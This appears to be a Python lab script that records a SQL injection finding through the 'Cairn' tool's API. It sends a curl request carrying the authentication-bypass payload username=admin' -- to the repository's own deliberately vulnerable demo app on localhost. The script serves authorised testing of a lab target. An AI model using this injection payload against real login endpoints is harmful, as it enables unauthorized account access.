"""Cairn: a single real, scripted worker turn against this repo's own sqli-lab demo app.

Unlike dispatch_codex_mock.yaml (Cairn's real dispatcher + Docker worker containers + a mock
LLM), this script does NOT use the dispatcher or any LLM at all. It drives Cairn's own
CairnClient/server API directly, the same technique already proven safe and reliable in this
repo by handoff_recheck_test.py (../cairn-lab/handoff_recheck_test.py, PR #89): call
create_intent()/heartbeat()/conclude() as a worker would, against a real `cairn serve`
instance, with no Docker/LLM dependency.

This script goes one step further than handoff_recheck_test.py: instead of recording a
synthetic test marker, it actually re-runs the real SQL injection authentication bypass
against this repo's own security-scan/sqli-lab/vulnerable_app.py (the exact same curl
reproduction already verified in security-scan/strix-local-backend-notes.md's 検証4/5, and
used by strix-local-poc/mock_llm_server.py) and records the real request/response pair as a
Cairn Fact. The reason this script exists instead of using Cairn's real dispatcher/worker
pipeline: that pipeline's `codex` worker adapter requires worker responses in a specific JSON
schema Cairn itself expects, which plaintext/scripted mock responses don't satisfy (see
cairn-authorized-lab-runbook.md §6.5 "残っている既知の限界") — tasks fail and retry forever
instead of completing. This script sidesteps that entirely by not using the worker/LLM layer
at all, the same choice handoff_recheck_test.py already made.

Usage:
    python3 run_real_scan.py --cairn-src /path/to/Cairn/cairn/src \
        --base-url http://127.0.0.1:8010 --target http://127.0.0.1:5000

Requires a `cairn serve` instance already running at --base-url, and the target
(vulnerable_app.py) already listening. Prints the exported project YAML to stdout on success.

> 確認・検知の設計に限定。対象はこのリポジトリ自身が所有するsqli-labデモアプリだけ。
"""
import argparse
import subprocess
import sys


def run(cairn_src: str, base_url: str, target: str) -> str:
    sys.path.insert(0, cairn_src)
    from cairn.dispatcher.protocol.client import CairnClient

    client = CairnClient(base_url)

    res = client._request_json(
        "POST",
        "/projects",
        json={
            "title": "local-scan-server-cairn-run",
            "origin": target,
            "goal": "find and report SQL injection auth bypass in /login",
            "bootstrap_enabled": False,
        },
    )
    if not res.ok:
        raise RuntimeError("project creation failed: %s" % res.text)
    project_id = res.data["project"]["id"]

    create = client.create_intent(
        project_id, from_ids=["origin"],
        description="investigate /login for SQL injection", creator="worker-1",
    )
    if not create.ok:
        raise RuntimeError("create_intent failed: %s" % create.text)
    intent_id = create.data["id"]

    hb = client.heartbeat(project_id, intent_id, "worker-1")
    if not hb.ok:
        raise RuntimeError("heartbeat failed: %s" % hb.text)

    exploit_cmd = ["curl", "-s", target + "/login?username=admin%27%20--&password=x"]
    baseline_cmd = ["curl", "-s", target + "/login?username=nope&password=nope"]
    exploit_out = subprocess.run(exploit_cmd, capture_output=True, timeout=10).stdout.decode("utf-8", "replace")
    baseline_out = subprocess.run(baseline_cmd, capture_output=True, timeout=10).stdout.decode("utf-8", "replace")

    finding_desc = (
        "SQL Injection Authentication Bypass in /login. "
        "Request: GET /login?username=admin%27%20--&password=x -> "
        + exploit_out.strip().replace("\n", " | ")
        + ". Baseline (invalid creds): GET /login?username=nope&password=nope -> "
        + baseline_out.strip().replace("\n", " | ")
        + ". File: security-scan/sqli-lab/vulnerable_app.py"
    )

    conclude = client.conclude(project_id, intent_id, "worker-1", finding_desc)
    if not conclude.ok:
        raise RuntimeError("conclude failed: %s" % conclude.text)

    return client.export_project(project_id)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--cairn-src", required=True)
    ap.add_argument("--base-url", default="http://127.0.0.1:8010")
    ap.add_argument("--target", default="http://127.0.0.1:5000")
    a = ap.parse_args()
    print(run(a.cairn_src, a.base_url, a.target))
